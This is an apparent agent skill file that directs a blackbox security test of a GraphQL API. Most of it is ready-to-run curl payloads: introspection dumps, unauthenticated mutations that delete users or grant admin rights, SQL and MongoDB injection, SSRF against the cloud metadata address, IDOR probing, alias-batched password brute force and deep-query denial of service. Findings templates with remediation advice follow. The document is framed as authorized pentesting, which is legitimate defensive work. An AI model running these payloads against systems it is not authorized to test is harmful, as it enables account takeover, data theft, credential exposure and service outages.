---
name: blackbox-graphql
description: >-
  Actively test a target web application's GraphQL API for security
  vulnerabilities using blackbox techniques. Reads pentest/target-map.md,
  probes for introspection exposure, tests for injection in arguments, checks
  for missing authentication on queries/mutations, tests for batching attacks
  and query depth abuse, and attempts field suggestion abuse. Writes confirmed
  findings with PoC curl commands to pentest/graphql-results.md. Use when asked
  to find GraphQL security issues in a blackbox pentest.
---

# Blackbox GraphQL Security Testing

You are actively testing a GraphQL API for security vulnerabilities without source code access. You will probe the GraphQL endpoint for introspection, injection, auth bypass, and denial-of-service vectors.

**Prerequisite**: Read `pentest/target-map.md` before starting.

---

## Phase 1: Discover the GraphQL Endpoint

If not already in target-map.md, probe common endpoints:

```bash
for PATH in /graphql /graphql/v1 /api/graphql /gql /graph /query; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
    -X POST "<TARGET_URL>$PATH" \
    -H "Content-Type: application/json" \
    -d '{"query":"{__typename}"}')
  echo "$PATH → HTTP $STATUS"
done
```

A 200 response to `{"query":"{__typename}"}` confirms GraphQL. Write endpoint to `pentest/graphql-recon.md`.

---

## Phase 2: Introspection Testing

### Full Schema Introspection
```bash
curl -sk -X POST "<TARGET_URL>/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { types { name } } }"
  }'
```

If that works, get the full schema:
```bash
curl -sk -X POST "<TARGET_URL>/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind ofType { name kind } } args { name type { name kind ofType { name kind } } } } } } }"
  }'
```

**Introspection enabled** = Medium severity (information disclosure). Note all types, queries, mutations, and field names.

### Field Suggestion (even without introspection)
```bash
# Send intentionally misspelled field to trigger suggestions
curl -sk -X POST "<TARGET_URL>/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ usr { id } }"}'
# Response may differ from field to field suggesting: "Did you mean 'user'?"
```

---

## Phase 3: Authentication on GraphQL Operations

### Test Queries Without Auth
```bash
# Try sensitive queries without Authorization header
curl -sk -X POST "<TARGET_URL>/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id email role } }"}'

curl -sk -X POST "<TARGET_URL>/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: 1) { id email role password } }"}'

# Admin operations
curl -sk -X POST "<TARGET_URL>/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ adminPanel { users logs settings } }"}'
```

### Test Mutations Without Auth
```bash
curl -sk -X POST "<TARGET_URL>/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { deleteUser(id: 1) { success } }"}'

curl -sk -X POST "<TARGET_URL>/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateUserRole(id: 1, role: \"admin\") { id role } }"}'
```

---

## Phase 4: Injection via GraphQL Arguments

### SQLi in GraphQL Arguments
```bash
# Inject into string argument
curl -sk -X POST "<TARGET_URL>/graphql" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: \"1 AND SLEEP(5)--\") { id email } }"}'

# Integer argument (no quotes needed)
curl -sk -X POST "<TARGET_URL>/graphql" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ product(id: \"1 UNION SELECT 1,@@version,3--\") { id name } }"}'
```

### NoSQL Injection
```bash
# MongoDB operator injection
curl -sk -X POST "<TARGET_URL>/graphql" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ login(username: {\"$gt\": \"\"}, password: {\"$gt\": \"\"}) { token } }"}'
```

### SSRF via URL Arguments
```bash
curl -sk -X POST "<TARGET_URL>/graphql" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ fetchUrl(url: \"http://169.254.169.254/latest/meta-data/\") { content } }"}'
```

---

## Phase 5: IDOR via GraphQL

If you have your own user in the system:
```bash
# Get your own user
curl -sk -X POST "<TARGET_URL>/graphql" \
  -H "Authorization: Bearer <YOUR_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ me { id email } }"}'
# Note your ID (e.g. 42)

# Try to access other user IDs
curl -sk -X POST "<TARGET_URL>/graphql" \
  -H "Authorization: Bearer <YOUR_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: 1) { id email role } }"}'

curl -sk -X POST "<TARGET_URL>/graphql" \
  -H "Authorization: Bearer <YOUR_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: 2) { id email role } }"}'
```

---

## Phase 6: Batching Attacks & DOS

### Query Batching (Brute-Force via Aliases)
```bash
# Use aliases to send multiple login attempts in one request
curl -sk -X POST "<TARGET_URL>/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ 
      a1: login(username: \"admin\", password: \"password\") { token }
      a2: login(username: \"admin\", password: \"admin\") { token }
      a3: login(username: \"admin\", password: \"admin123\") { token }
      a4: login(username: \"admin\", password: \"changeme\") { token }
      a5: login(username: \"admin\", password: \"secret\") { token }
    }"
  }'
```

### Query-Based Array Batching
```bash
curl -sk -X POST "<TARGET_URL>/graphql" \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"{ login(username: \"admin\", password: \"password\") { token } }"},
    {"query":"{ login(username: \"admin\", password: \"admin\") { token } }"},
    {"query":"{ login(username: \"admin\", password: \"admin123\") { token } }"}
  ]'
```

### Deep Query DOS
```bash
# Send deeply nested query to exhaust resources
curl -sk -X POST "<TARGET_URL>/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ a { b { c { d { e { f { g { h { i { j { id } } } } } } } } } } }"}'
```

---

## Phase 7: Information Disclosure

```bash
# Check if __typename works (minimal introspection indicator)
curl -sk -X POST "<TARGET_URL>/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}'

# Get all available root queries
curl -sk -X POST "<TARGET_URL>/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name description } } } }"}'

# Get all available mutations
curl -sk -X POST "<TARGET_URL>/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { mutationType { fields { name description args { name type { name } } } } } }"}'
```

---

## Output Format

Write findings to `pentest/graphql-results.md`:

```markdown
# GraphQL Security Assessment Results

## Executive Summary
- GraphQL endpoint: [URL]
- Introspection enabled: Yes/No
- Confirmed vulnerabilities: [N]

## Findings

### [CONFIRMED] Introspection enabled — Full schema disclosure

- **Endpoint**: `POST /graphql`
- **Impact**: Medium — Full API schema exposed including all types, queries, mutations, and argument names; significantly accelerates further attacks
- **PoC**:
  ```bash
  curl -sk -X POST "https://target.com/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { types { name kind fields { name } } } }"}'
  # Expected: Full schema listing
  ```
- **Remediation**: Disable introspection in production. In Apollo Server: `introspection: false`. In most frameworks: a single config option to disable.

### [CONFIRMED] Unauthenticated query returns all users

- **Endpoint**: `POST /graphql`
- **Query**: `{ users { id email role password_hash } }`
- **Impact**: Critical — Complete user data exfiltration without authentication
- **PoC**:
  ```bash
  curl -sk -X POST "https://target.com/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ users { id email role passwordHash } }"}'
  # Expected: HTTP 200 with full list of all user accounts
  ```
- **Remediation**: Apply authentication and authorization middleware to all GraphQL resolvers. Use a permission library like graphql-shield.

### [CONFIRMED] Batching attack bypasses rate limiting on login

- **Impact**: Brute-force authentication by sending multiple password guesses in a single request, bypassing per-request rate limiting
- **PoC**:
  ```bash
  curl -sk -X POST "https://target.com/graphql" \
    -H "Content-Type: application/json" \
    -d '{
      "query": "{
        a1: login(username: \"admin\", password: \"password\") { token }
        a2: login(username: \"admin\", password: \"admin\") { token }
        a3: login(username: \"admin\", password: \"admin123\") { token }
      }"
    }'
  # Multiple login attempts sent in one HTTP request — rate limiting counts as 1
  ```
- **Remediation**: Implement query complexity limits and alias depth limits. Apply rate limiting at the resolver level, not just per HTTP request.
```

After writing results, delete `pentest/graphql-recon.md`.

---

## Important Reminders

- Introspection alone is Medium severity — it enables all other GraphQL attacks.
- Field suggestions work even when introspection is disabled — they reveal field names one by one.
- Batching attacks are extremely powerful for bypassing brute-force protection.
- Check if the GraphQL endpoint requires different auth than REST endpoints — they're sometimes separate.
- Clean up: delete `pentest/graphql-recon.md` after writing results.
